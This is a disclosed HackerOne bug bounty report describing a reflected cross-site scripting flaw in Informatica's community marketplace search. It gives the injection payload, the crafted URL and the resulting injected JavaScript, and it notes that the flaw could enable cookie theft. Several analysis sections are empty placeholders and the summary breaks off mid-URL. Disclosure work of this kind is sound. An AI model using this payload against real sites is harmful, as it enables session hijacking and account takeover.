# XSS in Search Communities Function

## Metadata
- **Source:** HackerOne
- **Report:** 47235 | https://hackerone.com/reports/47235
- **Submitted:** 2015-02-09
- **Reporter:** ddworken
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** medium
- **Vuln:** Cross-site Scripting (XSS) - Generic
- **CVEs:** None
- **Category:** web-api

## Summary
When you search for a URL on the communities page, you visit a URL that looks like this
```
https://community.informatica.com/community/marketplace/search/?blkCatIds=free+apps&view=solution
```

By replacing the search query with 
``` html
";alert(0);t="
```

and making the final URL:

```
https://community.informatica.com/community/marketplace/%22;alert(0);t=%22/?blkCatIds=free+apps&

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

When you search for a URL on the communities page, you visit a URL that looks like this
```
https://community.informatica.com/community/marketplace/search/?blkCatIds=free+apps&view=solution
```

By replacing the search query with 
``` html
";alert(0);t="
```

and making the final URL:

```
https://community.informatica.com/community/marketplace/%22;alert(0);t=%22/?blkCatIds=free+apps&view=solution
```

You make the page's javascript code, turn into

``` javascript
        var profileShortUrl = "/profile-short.jspa";
        var profileLoadingTooltip = "Loading user profile";
        var profileErrorTooltip = "There was an error loading that profile information.";

        var projectChooserUrl = "/community/marketplace/";
        alert(0);
        t="/project-chooser!input.jspa";

        var containerShortUrl = "/container-short.jspa";
        var containerLoadingTooltip = "Loading place information.";
        var containerErrorTooltip = "There was an error loading that place information.";

        var videoShortUrl = "/view-video-short.jspa";
        var videoLoadingTooltip = "video.tooltip.loading";
        var videoErrorTooltip = "video.tooltip.error";
        var _jive_video_picker__url = "?container=1&containerType=14";
        var followErrorMessage = "An internal error ocurred while following the project or space.";

        (function() {
            var originalWrite = document.write;
            document.write = function() {
                if(typeof $j != 'undefined' && $j.isReady) {
                    console.warn("document.write called after document was loaded: ", arguments);
                }
                else {
                    // In IE before version 8 `document.write()` does not
                    // implement Function methods, like `apply()`.
                    return Function.prototype.apply.call(originalWrite, document, arguments);
                }
            }
        })();        
```
This is an example of a injected javascript XSS vulnerability. With this, one can also exfiltrtrate user's cookies to another server allowing account takeovers. 

</details>

---
*Analysed by Claude on 2026-05-24*
